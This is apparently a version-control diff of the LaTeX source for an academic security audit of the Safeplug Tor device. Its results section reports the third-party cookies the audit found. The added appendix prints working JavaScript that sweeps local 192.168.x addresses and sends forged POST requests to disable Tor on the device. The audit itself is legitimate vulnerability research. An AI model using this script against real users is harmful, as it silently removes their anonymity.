Security Audit of Safeplug

### 2014-01-24 report/report.tex
reorganize
appendix and cookies

%\usepackage{caption}
\usepackage{subcaption}
%\usepackage[small,compact]{titlesec}
\usepackage{listings}
\lstnewenvironment{fileName}{%
\lstset{%
        basicstyle=\ttfamily,
        breaklines,
    }%
}{%
}

@@

Anna Kornfeld Simpson and Annie Edmunson

@@

>>>>

%\usepackage{caption}
\usepackage{subcaption}
%\usepackage[small,compact]{titlesec}
\usepackage{listings}
\usepackage{listings}
\usepackage{color}
\lstnewenvironment{fileName}{%
\lstset{%
        basicstyle=\ttfamily,
        breaklines,
    }%
}{%
}

@@

Anna Kornfeld Simpson and Annie Edmundson

@@

\newpage
\appendix
\section{\\Javascript for Website Attack} \label{App:AppendixA}
\definecolor{dkgreen}{rgb}{0,0.6,0}
\definecolor{gray}{rgb}{0.5,0.5,0.5}
\definecolor{mauve}{rgb}{0.58,0,0.82}

\lstset{frame=tb,
  language=Java,
  aboveskip=3mm,
  belowskip=3mm,
  showstringspaces=false,
  columns=flexible,
  basicstyle={\small\ttfamily},
  numbers=none,
  numberstyle=\tiny\color{gray},
  keywordstyle=\color{blue},
  commentstyle=\color{dkgreen},
  stringstyle=\color{mauve},
  breaklines=true,
  breakatwhitespace=true
  tabsize=3
}

\begin{lstlisting}
function go() { 
   var IP_SCANS = 255;
   var prefixes = new Array("http://192.168.0.", "http://192.168.1.");
   //var prefix = "http://172.";
   var prefix = "http://192."
   var SECOND_START = 168;
   var SECOND_END = 168;
   var THIRD_START = 0;
   var THIRD_END = 1;
   var mydate = new Date();
   console.log(mydate.getTime());

   for (var i = SECOND_START; i <= SECOND_END; i++) {
      for (var j = THIRD_START; j <= THIRD_END; j++) {
         for (var k = 0; k < IP_SCANS; k++) 
         {
            var tryip = prefix +  i + "." + j + "." + k;
            var req = new XMLHttpRequest();
            req.open("POST", tryip + "/svc/xspctrl/disableTor", true);
            req.timeout = 1000;
            //console.log(reqs[i].readyState);
/*         req.onreadystatechange = function (ip) 
           { 
           return function() { console.log(ip); }
           } (tryip); */
            //console.log(reqs[i]);
            req.send();
         }
         // COMMENT THIS OUT BEFORE RUNNING LARGE SCANS!
         var mydate2 = new Date();
         console.log(mydate2.getTime() + " " + j);
      }
      var mydate = new Date();
      console.log(mydate.getTime() + " " + i);
   }
}
\end{lstlisting}

### 2014-01-24 report/results.tex
appendix and cookies

More interesting and damaging to the user's control over their anonymity would be third-party cookies because the user cannot remove those just by logging out.  It requires a trip to the browser settings to clear cookies (or not have them set in the first place).  We used the FourthParty plugin developed by Jonathan Mayer at Stanford to collect information about cookies and other browsing data during the client's use of the Safeplug \cite{fourthparty}, and future work will include an analysis of this data, particularly looking for third-party cookies.

>>>>

More interesting and damaging to the user's control over their anonymity would be third-party cookies because the user cannot remove those just by logging out.  It requires a trip to the browser settings to clear cookies (or not have them set in the first place).  We used the FourthParty plugin developed by Jonathan Mayer at Stanford to collect information about cookies and other browsing data during the client's use of the Safeplug \cite{fourthparty}.  When collecting data on the existence of third-party cookies, we analyzed two separate browsing sessions; they were both new sessions with no cookies.  One of the sessions used the ad-block feature of the Safeplug and the other did not.  After analyzing data from Fourthparty, we found many third-party cookies in both sessions.  These included cookies from: abmr.net, bizographics.com, krxd.net, and bluekai.com among many others.
